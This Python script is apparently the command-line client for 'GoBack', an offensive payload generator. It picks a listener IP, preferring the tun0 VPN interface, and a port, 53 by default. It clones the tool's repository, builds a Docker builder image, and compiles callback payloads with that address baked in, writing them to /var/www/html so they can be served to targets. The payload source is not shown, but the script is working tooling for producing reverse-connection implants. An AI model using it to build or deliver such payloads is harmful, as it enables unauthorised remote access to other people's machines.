#!/usr/bin/env python3
import argparse
import netifaces as ni
import docker
import git
import os
from pathlib import Path
from colorama import init as colorama_init
from colorama import Fore
from colorama import Style
import uuid

colorama_init()

parser = argparse.ArgumentParser()
parser.add_argument('-i', type=str, default='', help='Interface or IP')
parser.add_argument('-p', type=int, default=53, help='Port')
parser.add_argument('--old', action='store_true', help='Old systems support')
parser.add_argument('--protocol', type=str, default='TCP', help='Protocol to use')
parser.add_argument('--debug', action='store_true', help='Debug')
parser.add_argument('--nokeepalive', action='store_true', help='Disable keepalive')
args = parser.parse_args()

repo = 'https://github.com/charlesgargasson/goback'
homefolder = str(Path.home())
repo_path = f'{homefolder}/goback'

printheader = f"{Fore.GREEN}[GOBACK CLI]{Style.RESET_ALL}"

def main() -> None:
    print(f"{printheader} Starting GoBack payload client {Style.RESET_ALL}")
    LPORT = args.p
    LHOST = args.i
    if LHOST in ni.interfaces():
        LHOST = ni.ifaddresses(LHOST)[ni.AF_INET][0]['addr']
    elif not LHOST :
        if 'tun0' in ni.interfaces():
            LHOST = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']
        else:
            def_gw_device = ni.gateways()['default'][ni.AF_INET][1]
            LHOST = ni.ifaddresses(def_gw_device)[ni.AF_INET][0]['addr']

    if args.old:
        print(f"{printheader} Old systems support : {Fore.GREEN}TRUE {Style.RESET_ALL}")
    else:
        print(f"{printheader} Old systems support :{Fore.RED} FALSE {Style.RESET_ALL}")

    print(f"{printheader} Address : {Fore.GREEN}{LHOST}{Style.RESET_ALL}:{Fore.GREEN}{LPORT}{Style.RESET_ALL}")

    if not os.path.isdir(repo_path):
        print(f"{printheader} Cloning goback repo to {repo_path} {Style.RESET_ALL}")
        git.Repo.clone_from(repo, repo_path)
    else:
        print(f"{printheader} Goback repo found at {repo_path} {Style.RESET_ALL}")

    print(f"{printheader} Connecting to Docker daemon {Style.RESET_ALL}")
    dockerclient = docker.from_env()

    builder = 'gobackbuilder'
    buildertag = 'latest'
    if args.old:
        builder = 'gobackbuilderold'

    if not dockerclient.images.list(name=f'{builder}:{buildertag}'):
        print(f"{printheader} Builder image not found, creating ... {Style.RESET_ALL}")

        dockerfile = f'{repo_path}/src/Dockerfile'
        if args.old:
            dockerfile = f'{repo_path}/src/DockerfileOLD'

        with open(dockerfile, 'rb') as file:
            dockerclient.images.build(
                fileobj=file,
                tag=builder
            )

    else:
        print(f'{printheader} Builder image found {Style.RESET_ALL}')

    buildsrc = f'{repo_path}/src/'
    builduuid = str(uuid.uuid4())

    print(f"{printheader} Building payloads from {buildsrc} {Style.RESET_ALL}")
    volumes = {
        f'{buildsrc}': {
            'bind': f'/{builduuid}',
            'mode': 'rw'
        },
        '/var/www/html/': {
            'bind': '/var/www/html',
            'mode': 'rw'
        }
    }

    PROTO = args.protocol
    keepalive = 0 if args.nokeepalive else 1

    environment = {
        'LHOST': LHOST,
        'LPORT': LPORT,
        'PROTO': PROTO,
        'KEEPALIVE': keepalive
    }

    auto_remove=True
    if args.debug :
        auto_remove=False
                            
    container = dockerclient.containers.run(
        image=builder,
        volumes=volumes,
        environment=environment,
        entrypoint='/bin/bash',
        command=f'/{builduuid}/build.sh',
        detach=True, tty=True, auto_remove=auto_remove
    )

    print(f"{printheader} Now streaming container output ...")
    print("-"*70)
    for line in container.attach(stdout=True, stderr=True, stream=True, logs=True):
        print(line.decode(), end='')

if __name__ == '__main__':
    main()